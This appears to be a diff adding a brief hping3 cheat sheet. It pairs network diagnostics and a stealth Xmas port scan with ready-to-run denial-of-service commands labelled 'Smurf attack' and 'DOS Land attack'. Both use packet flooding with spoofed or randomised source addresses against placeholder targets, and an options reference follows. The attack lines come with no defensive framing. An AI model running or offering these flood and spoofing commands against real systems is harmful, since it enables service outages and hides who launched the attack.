@@ -1,0 +1,28 @@
+# Testing ICMP
+hping3 -1 $url
+
+# Traceroute to a determined port:
+hping3 --traceroute -V -S -p $port -s 5050 $url
+
+# XMas Scan
+hping3 -c 1 -V -p $port -s 5050 -M 0 -UPF $url
+
+# Smurf attack
+hping3 -1 --flood -a $ip BROADCAST_ADDRESS
+
+# DOS Land attack
+hping3 -V -c 1000000 -d 120 -S -w 64 -p $port -s $port --flood --rand-source $ip
+
+# HPING3 Options
+-1 --icmp ICMP Mode
+-v --verbose verbose mode
+-S --syn set SYN flag
+-p destination port. default = 0
+-s --baseport base source port (default random)
+-c --count packet count
+-M --setseq set TCP sequence number
+-w --win winsize
+-d --data data size (default 0)
+--flood send packets as fast as possible. Don't show replies.
+--rand-source random source address mode
+-T --traceroute - traceroute mode
